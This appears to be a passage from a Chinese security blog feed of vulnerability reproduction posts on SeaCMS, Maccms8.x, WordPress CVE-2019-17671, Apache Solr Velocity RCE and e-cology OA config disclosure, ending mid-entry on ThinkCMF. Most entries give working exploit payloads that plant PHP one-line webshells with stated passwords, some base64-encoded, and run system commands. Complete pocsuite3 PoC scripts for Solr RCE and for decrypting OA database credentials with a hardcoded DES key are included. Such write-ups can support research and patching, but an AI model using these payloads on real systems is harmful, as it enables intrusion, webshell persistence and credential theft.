        <content type="html"><![CDATA[<h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><p>海洋CMS V6.28 存在命令执行漏洞，漏洞具体内容参见：<br><a href="https://www.uedbox.com/post/8857/" target="_blank" rel="noopener"> 海洋CMS V6.28 命令执行 0DAY</a></p><p>在2017年2月，海洋CMS 6.45版本存在一个前台getshell漏洞，漏洞具体内容参见：<br><a href="https://bbs.ichunqiu.com/thread-35085-1-1.html" target="_blank" rel="noopener">SeaCMS v6.45前台Getshell 代码执行漏洞分析</a><br><a href="http://blog.csdn.net/qq_35078631/article/details/76595817" target="_blank" rel="noopener">Seacms漏洞分析利用复现 By Assassin - Assassin - CSDN博客</a><br>该漏洞成因在于search.php没有对用户输入内容进行过滤，导致攻击者提交的order参数可进入parseIf函数中执行eval。  </p><p>官方在6.46版中修复了该漏洞，修复方法是对用户输入的参数进行过滤并限制长度为20个字符。<br>但这种修复方法并没有完全修复漏洞，因为在替换操作过程中用户输入的几个参数可以进行组合，因此补丁被绕过。  </p><p>随后官方又在8月7日发布了6.54版本再次修复漏洞，这次修复增加了一句：</p><p><code>$order = ($order == &quot;commend&quot; || $order == &quot;time&quot; || $order == &quot;hit&quot;) ? $order : &quot;&quot;;</code></p><p>即限制了order参数只能是固定内容，这样虽然避免了通过order参数进行的攻击，但是却没有解决其他参数进入parseIf函数的问题。</p><p><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="noopener">漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警</a></p><p>6.54版本更新中，官方给出的修复是在parseIf函数里面加了黑名单。<br>但是没有做SERVER变量的过滤，所以可以用SERVER变量的性质来达到写入命令。<br> <a href="https://bbs.ichunqiu.com/thread-35140-1-5.html" target="_blank" rel="noopener">SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞分析(附批量getshell脚本)</a></p><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><h2 id="海洋CMS-V6-28"><a href="#海洋CMS-V6-28" class="headerlink" title="海洋CMS V6.28"></a>海洋CMS V6.28</h2><p>详见：<br><a href="https://www.uedbox.com/post/8857/" target="_blank" rel="noopener"> 海洋CMS V6.28 命令执行 0DAY</a></p><p>一句话payload，密码<code>cmd</code>: </p><p><code>url+/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd])</code></p><h2 id="海洋CMS-V6-45"><a href="#海洋CMS-V6-45" class="headerlink" title="海洋CMS V6.45"></a>海洋CMS V6.45</h2><p>详见：<br><a href="https://bbs.ichunqiu.com/thread-35085-1-1.html" target="_blank" rel="noopener">SeaCMS v6.45前台Getshell 代码执行漏洞分析</a></p><p>path:<br><code>url+/search.php</code><br>POST:<br><code>searchtype=5&amp;order=}{end if} {if:1)phpinfo();if(1}{end if}</code></p><p><a href="https://www.cnblogs.com/sqyysec/p/7765703.html" target="_blank" rel="noopener">【代码审计】seacms 前台Getshell分析</a></p><p>path:<br><code>url+/search.php</code></p><pre><code>searchtype=5&amp;searchword=d&amp;order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&amp;func=assert&amp;cmd=phpinfo();</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191105090018.png" alt></p><p><a href="https://www.cnblogs.com/bay1/p/10982344.html" target="_blank" rel="noopener">seacms最新版前台getshell</a><br>一句话payload，文件<code>test.php</code>  密码<code>pass</code>:<br>path:<br><code>url+/search.php</code></p><pre><code>}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&amp;func=assert&amp;cmd=fwrite(fopen(&quot;test.php&quot;,&quot;w&quot;),&#39;&lt;?php eval($_POST[&quot;pass&quot;]);?&gt;&#39;)</code></pre><h2 id="海洋CMS-V6-54"><a href="#海洋CMS-V6-54" class="headerlink" title="海洋CMS V6.54"></a>海洋CMS V6.54</h2><p>详见：<br><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="noopener">漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警</a><br><a href="https://bbs.ichunqiu.com/thread-35140-1-5.html" target="_blank" rel="noopener">SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞分析(附批量getshell脚本)</a></p><p>path:<br><code>url+/search.php</code><br>POST:</p><pre><code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo();</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191105092054.png" alt></p><p>命令执行payload</p><p>path:<br><code>url+/search.php</code><br>POST:</p><pre><code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=sy&amp;9[]=stem(&quot;whoami&quot;);</code></pre><p>url一句话拿shell<br>详见：<br><a href="https://zzreno.github.io/2019/05/19/记一次海洋cms任意代码执行漏洞拿shell-url一句话马/" target="_blank" rel="noopener">记一次海洋cms任意代码执行漏洞拿shell(url一句话马)</a></p><p>权限足够的话，<code>file_put_concents(“connect.php”,”“)</code>，然后连接菜刀即可。<br>权限不足的话，利用payload构造url：</p><p><code>url+/search.php?searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))</code></p><p>连接放入菜刀，密码是 <code>9[]</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191105094457.png" alt></p><h2 id="海洋CMS-V6-55"><a href="#海洋CMS-V6-55" class="headerlink" title="海洋CMS V6.55"></a>海洋CMS V6.55</h2><p>详见：<br><a href="https://bbs.ichunqiu.com/thread-35140-1-5.html" target="_blank" rel="noopener">SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞分析(附批量getshell脚本)</a></p><p>path:<br><code>url+/search.php</code><br>POST:</p><pre><code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:as{searchpage:area}}&amp;area=s{searchpage:letter}&amp;letter=ert{searchpage:lang}&amp;yuyan=($_SE{searchpage:jq}&amp;jq=RVER{searchpage:ver}&amp;&amp;ver=[QUERY_STRING]));/*</code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.uedbox.com/post/8857/" target="_blank" rel="noopener"> 海洋CMS V6.28 命令执行 0DAY</a><br><a href="https://bbs.ichunqiu.com/thread-35085-1-1.html" target="_blank" rel="noopener">SeaCMS v6.45前台Getshell 代码执行漏洞分析</a><br><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="noopener">漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警</a><br><a href="https://zzreno.github.io/2019/05/19/记一次海洋cms任意代码执行漏洞拿shell-url一句话马/" target="_blank" rel="noopener">记一次海洋cms任意代码执行漏洞拿shell(url一句话马)</a><br><a href="https://bbs.ichunqiu.com/thread-35140-1-5.html" target="_blank" rel="noopener">SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞分析(附批量getshell脚本)</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Command Execution </tag>
            
            <tag> 海洋cms </tag>
            
            <tag> Seacms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maccms8.x(苹果cms)命令执行漏洞复现</title>
      <link href="/2019/11/04/maccms8.x-ming-ling-zhi-xing-lou-dong-fu-xian-ping-guo-cms/"/>
      <url>/2019/11/04/maccms8.x-ming-ling-zhi-xing-lou-dong-fu-xian-ping-guo-cms/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><p>村里刚通网，复现下maccms的命令执行漏洞<br>该漏洞主要的产生原因是CMS搜索页面搜索参数过滤不严<br>导致直接eval执行PHP语句，前台命令执行可getshell</p><h1 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h1><p><strong>Maccms8.x</strong></p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载Github上的环境：<br><a href="https://github.com/yaofeifly/Maccms8.x" target="_blank" rel="noopener">Maccms8.x源码</a></p><p>然后使用<code>phpstudy</code>搭建安装即可<br>也可自己搭建<code>Apache+Mysql+php</code>环境安装</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104164824.png" alt></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>payload：</p><p><code>url+/index.php?m=vod-search&amp;wd={if-A:phpinfo()}{endif-A}</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104165220.png" alt></p><p>getshell payload（a）:</p><p><code>url+/index.php?m=vod-search&amp;wd={if-A:assert($_POST[a])}{endif-A}</code><br>POST<br><code>a=phpinfo()</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104170625.png" alt></p><p>写入网站根目录一句话木马文件payload（文件名：test.php，密码：test）:</p><p><code>url+/index.php?m=vod-search</code></p><pre><code>wd={if-A:print(fputs%28fopen%28base64_decode%28dGVzdC5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW3Rlc3RdKTsgPz4%29%29)}{endif-A}</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104173840.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104174007.png" alt></p><h1 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a>0x03 参考文章</h1><p><a href="https://blog.csdn.net/m0_37438418/article/details/81006161" target="_blank" rel="noopener">苹果CMS漏洞</a><br><a href="https://github.com/yaofeifly/Maccms8.x" target="_blank" rel="noopener">Maccms8.x: Maccms8.x</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Maccms </tag>
            
            <tag> 苹果cms </tag>
            
            <tag> Command Execution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wordpress未授权访问漏洞复现(CVE-2019-17671)</title>
      <link href="/2019/11/04/wordpress-wei-shou-quan-fang-wen-lou-dong-fu-xian-cve-2019-17671/"/>
      <url>/2019/11/04/wordpress-wei-shou-quan-fang-wen-lou-dong-fu-xian-cve-2019-17671/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><p>wordpress 爆出最新的查看未经身份验证的文章漏洞，<br>该漏洞源于程序没有正确处理静态查询，<br>攻击者可利用该漏洞未经认证查看部分内容。</p><h1 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h1><p><strong>WordPress &lt;= 5.2.3</strong></p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本地搭建 WordPress 5.2.3 版本</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104110719.png" alt></p><p>登陆后台新建私密页面</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104110946.png" alt></p><p>随便填入内容，选择私密，发布<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104111053.png" alt></p><p>访问前台页面，退出登陆，模拟外部访问</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104111225.png" alt></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接访问，查看不了私密文章</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104111440.png" alt></p><p>输入<code>payload</code>访问，即可未授权访问所有文章</p><p><code>url+/?static=1&amp;order=asc</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104111641.png" alt></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.seebug.org/vuldb/ssvid-98098" target="_blank" rel="noopener">wordpress 查看未经身份验证的文章(CVE-2019-17671) - Knownsec Seebug Vulnerability Platform</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247483931&idx=1&sn=44723857a94560c9c6058a06cec4faa7" target="_blank" rel="noopener">CVE-2019-17671：Wordpress未授权访问漏洞复现</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Wordpress </tag>
            
            <tag> CVE-2019-17671 </tag>
            
            <tag> 未授权访问 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>apache_solr_via_velocity_template_rce复现</title>
      <link href="/2019/10/31/apache-solr-via-velocity-template-rce-fu-xian/"/>
      <url>/2019/10/31/apache-solr-via-velocity-template-rce-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><p>Apache Solr 默认集成 VelocityResponseWriter 插件</p><p>该插件初始化参数中的<br><code>params.resource.loader.enabled</code><br>用来控制是否允许参数资源加载器在 <code>Solr</code> 请求参数中指定模版</p><p>该参数默认值是<code>False</code>，可以通过构造 POST 请求直接修改集合设置，</p><p>将<code>params.resource.loader.enabled</code>设置为<code>true</code></p><p>然后构造GET请求来进行远程代码执行漏洞</p><h1 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h1><p>包括不限于最新版 8.2.0</p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><h2 id="获取core-name"><a href="#获取core-name" class="headerlink" title="获取core name"></a>获取core name</h2><p>访问Core Admin得到<code>core name</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191031161555.png" alt></p><p>有的没有<code>Core Admin</code>按钮<br>直接访问 <code>url/solr/admin/cores?wt=json&amp;indexInfo=false</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191031161914.png" alt></p><h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><p>访问   <code>url/solr/core name/config</code><br>查找 <code>solr.resource.loader.enabled</code> 是否为 <code>true</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191031162555.png" alt></p><p>如果为false，构造post请求，修改</p><pre><code>{  &quot;update-queryresponsewriter&quot;: {    &quot;startup&quot;: &quot;lazy&quot;,    &quot;name&quot;: &quot;velocity&quot;,    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,    &quot;template.base.dir&quot;: &quot;&quot;,    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;  }}</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191031163002.png" alt></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><pre><code>url/solr/core name/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191031163326.png" alt></p><h1 id="0x03-POC"><a href="#0x03-POC" class="headerlink" title="0x03 POC"></a>0x03 POC</h1><pre><code>#! python3&quot;&quot;&quot;@FileName: apache_solr_via_velocity_template_rce.py@Author: dylan@software: PyCharm @Datetime: 2019-10-31 14:54&quot;&quot;&quot;import jsonfrom abc import ABCfrom pocsuite3.api import Output, POCBase, register_poc, requests, loggerdef get_core_name(url):    url += &quot;/solr/admin/cores?wt=json&amp;indexInfo=false&quot;    res = requests.get(url, verify=False, timeout=30)    core_name = list(json.loads(res.text)[&quot;status&quot;])[0]    return core_namedef update_config(path):    headers = {        &#39;User-Agent&#39;: &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; &quot;                      &quot;.NET CLR 2.0.50727)&quot;,        &#39;Content-Type&#39;: &#39;application/json&#39;    }    data = &quot;&quot;&quot;    {        &quot;update-queryresponsewriter&quot;: {            &quot;startup&quot;: &quot;lazy&quot;,            &quot;name&quot;: &quot;velocity&quot;,            &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,            &quot;template.base.dir&quot;: &quot;&quot;,            &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,            &quot;params.resource.loader.enabled&quot;: &quot;true&quot;        }    }    &quot;&quot;&quot;    res = requests.post(path, data=data, headers=headers, verify=False, timeout=30)    return resdef send_payload(path, core_name, cmd):    headers = {        &#39;User-Agent&#39;: &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; &quot;                      &quot;.NET CLR 2.0.50727)&quot;    }    payload = path + &quot;/solr/&quot; + core_name + &quot;/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom&quot; \                                            &quot;=%23set(&quot; \                                            &quot;$x=%27%27)+%23set($rt=$x.class.forName(&quot; \                                            &quot;%27java.lang.Runtime%27))+%23set(&quot; \                                            &quot;$chr=$x.class.forName(%27java.lang.Character%27))+%23set(&quot; \                                            &quot;$str=$x.class.forName(&quot; \                                            &quot;%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(&quot; \                                            &quot;%27&quot; + cmd + &quot;%27))+$ex.waitFor(&quot; \                                                          &quot;)+%23set($out=$ex.getInputStream())+%23foreach($i+in+[&quot; \                                                          &quot;1..$out.available(&quot; \                                                          &quot;)])$str.valueOf($chr.toChars($out.read()))%23end&quot;    res = requests.get(payload, headers=headers, verify=False, timeout=30)    return resclass DemoPOC(POCBase, ABC):    vulID = &quot;0&quot;  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0    version = &quot;3.0&quot;  # 默认为1    author = &quot;dylan&quot;  # PoC作者的大名    vulDate = &quot;2019/10/31&quot;  # 漏洞公开的时间,不知道就写今天    createDate = &quot;2019/10/31&quot;  # 编写 PoC 的日期    updateDate = &quot;2019/10/31&quot;  # PoC 更新的时间,默认和编写时间一样    references = [&quot;https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template&quot;]  # 漏洞地址来源,0day不用写    name = &quot;apache_solr_via_velocity_template_rce&quot;  # PoC 名称    appPowerLink = &quot;&quot;  # 漏洞厂商主页地址    appName = &quot;solr&quot;  # 漏洞应用名称    appVersion = &quot;&lt;8.2.0&quot;  # 漏洞影响版本    vulType = &quot;RCE&quot;  # 漏洞类型,类型参考见 漏洞类型规范表    desc = &quot;&quot;&quot;    &quot;&quot;&quot;  # 漏洞简要描述    samples = [&quot;&quot;]  # 测试样列,就是用 PoC 测试成功的网站    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写    pocDesc = &quot;&quot;&quot;    &quot;&quot;&quot;    def _verify(self):        # 验证代码        result = {}        core_name = get_core_name(self.url)        path = self.url + &quot;/solr/&quot; + core_name + &quot;/config&quot;        res = requests.get(path, verify=False, timeout=30)        if (&#39;&quot;solr.resource.loader.enabled&quot;:&quot;true&quot;&#39; not in res.text) or (                &#39;&quot;params.resource.loader.enabled&quot;:&quot;true&quot;&#39; not in res.text):            res = update_config(path)            if res.status_code != 200:                return self.parse_output(result)        cmd = &quot;echo hello&quot;        res = send_payload(self.url, core_name, cmd)        # print(res.text)        if res.status_code == 500:            cmd = &quot;whoami&quot;            res = send_payload(self.url, core_name, cmd)            if res.status_code == 200:                result[&#39;VerifyInfo&#39;] = {}                result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url                result[&#39;VerifyInfo&#39;][&#39;whoami&#39;] = res.text        elif &quot;hello&quot; in res.text and &quot;responseHeader&quot; not in res.text:  # result是返回结果            result[&#39;VerifyInfo&#39;] = {}            result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url            result[&#39;VerifyInfo&#39;][&#39;echo hello&#39;] = res.text        return self.parse_output(result)    def _attack(self):        # 攻击代码        return self._verify()    def parse_output(self, result):        output = Output(self)        if result:            output.success(result)        else:            output.fail(&quot;Internet nothing returned&quot;)        return output# 注册 DemoPOC 类register_poc(DemoPOC)</code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template" target="_blank" rel="noopener">Apache_Solr_RCE_via_Velocity_template: Apache_Solr_RCE_via_Velocity_template</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> solr </tag>
            
            <tag> via_velocity_template </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>泛微ecology OA数据库配置信息泄露漏洞复现</title>
      <link href="/2019/10/28/fan-wei-ecology-oa-shu-ju-ku-pei-zhi-xin-xi-xie-lu-lou-dong-fu-xian/"/>
      <url>/2019/10/28/fan-wei-ecology-oa-shu-ju-ku-pei-zhi-xin-xi-xie-lu-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><p>泛微ecology OA系统接口存在数据库配置信息泄露漏洞,<br>攻击者可通过该漏洞页面直接获取到数据库配置信息，<br>攻击者可通过访问存在漏洞的页面并解密从而获取数据库配置信息</p><h1 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h1><p><strong>漏洞涉及范围包括不限于8.0、9.0版</strong></p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>附上 <strong>ecology8.1安装包+安装教程</strong><br>百度链接：<a href="https://pan.baidu.com/s/1ciU0clOlqV3iDqQ6Ic2RAA" target="_blank" rel="noopener">https://pan.baidu.com/s/1ciU0clOlqV3iDqQ6Ic2RAA</a><br>提取码: 3xh9 </p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接访问存在漏洞路径，<br>结果为DES加密以后的乱码</p><p><code>url+/mobile/DBconfigReader.jsp</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104142320.png" alt></p><p>查看返回的数据，发现存在一些<code>\r\n</code>，需要去掉<code>\r\n</code>，<br>可以选择切片取出数据，也可以使用repalce替换<br>再使用DES算法结合密钥进行解密之后，<br>即可获得数据库相关信息，密钥为<code>1z2x3c4v</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104142755.png" alt></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>#! python3&quot;&quot;&quot;@FileName: e_cology_oa_info_disclosure.py.py@Author: dylan@software: PyCharm @Datetime: 2019-10-28 10:30&quot;&quot;&quot;import base64import urllib.parsefrom pocsuite3.api import Output, POCBase, register_poc, requests, loggerfrom pyDes import *class DemoPOC(POCBase):    vulID = &quot;&quot;  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0    version = &quot;3.0&quot;  # 默认为1    author = &quot;dylan&quot;  # PoC作者的大名    vulDate = &quot;2019/10/29&quot;  # 漏洞公开的时间,不知道就写今天    createDate = &quot;2019/10/29&quot;  # 编写 PoC 的日期    updateDate = &quot;2019/10/29&quot;  # PoC 更新的时间,默认和编写时间一样    references = [&quot;&quot;]  # 漏洞地址来源,0day不用写    name = &quot;e_cology_oa_info_disclosure&quot;  # PoC 名称    appPowerLink = &quot;&quot;  # 漏洞厂商主页地址    appName = &quot;e_cology_oa&quot;  # 漏洞应用名称    appVersion = &quot;&quot;  # 漏洞影响版本    vulType = &quot;info_disclosure&quot;  # 漏洞类型,类型参考见 漏洞类型规范表    desc = &quot;&quot;&quot;    &quot;&quot;&quot;  # 漏洞简要描述    samples = [&quot;&quot;]  # 测试样列,就是用 PoC 测试成功的网站    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写    pocDesc = &quot;&quot;&quot;    &quot;&quot;&quot;    def _verify(self):        # 验证代码        result = {}        headers = {            &#39;User-Agent&#39;: &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; &quot;                          &quot;.NET CLR 2.0.50727)&quot;,        }        path = self.url + &quot;/mobile/DBconfigReader.jsp&quot;        respose = requests.get(path, headers=headers, verify=False, timeout=30).content.replace(b&#39;\r\n&#39;, b&#39;&#39;)        # print(respose)        respose = str(des(&#39;1z2x3c4v&#39;).decrypt(respose))        # print(respose)        if &quot;user&quot; in respose:  # result是返回结果            result[&#39;VerifyInfo&#39;] = {}            result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = path            result[&#39;DBInfo&#39;] = respose        return self.parse_output(result)    def _attack(self):        # 攻击代码        return self._verify()    def parse_output(self, result):        output = Output(self)        if result:            output.success(result)        else:            output.fail(&quot;Internet nothing returned&quot;)        return output# 注册 DemoPOC 类register_poc(DemoPOC)</code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247483918&idx=1&sn=9319c04f7d7dad68f224b24ceb46e05e" target="_blank" rel="noopener">泛微 e-cology OA 数据库配置信息泄露漏洞复现</a><br><a href="https://github.com/jas502n/DBconfigReader" target="_blank" rel="noopener">DBconfigReader: 泛微ecology OA系统接口存在数据库配置信息泄露漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 泛微e-cology OA </tag>
            
            <tag> info_disclosure </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkCMF框架任意内容包含漏洞复现</title>
      <link href="/2019/10/24/thinkcmf-kuang-jia-ren-yi-nei-rong-bao-han-lou-dong-fu-xian/"/>
      <url>/2019/10/24/thinkcmf-kuang-jia-ren-yi-nei-rong-bao-han-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><p>ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。</p><p>利用此漏洞无需任何权限情况下，构造恶意的url，可以向服务器写入任意内容的文件，实现远程代码执行。</p><h1 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h1><ul><li>ThinkCMF X1.6.0</li><li>ThinkCMF X2.1.0</li><li>ThinkCMF X2.2.0</li><li>ThinkCMF X2.2.1</li><li>ThinkCMF X2.2.2</li><li>ThinkCMF X2.2.3</li></ul><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本地使用phpstudy搭建<code>ThinkCMF X2.2.3</code></p><p>记得使用<code>Nginx</code>服务器，不然安装界面会提示没有权限。</p><p><code>You don&#39;t have permission to access / on this server.</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191024121247.png" alt></p><p>根据安装向导安装即可</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191024121445.png" alt></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" 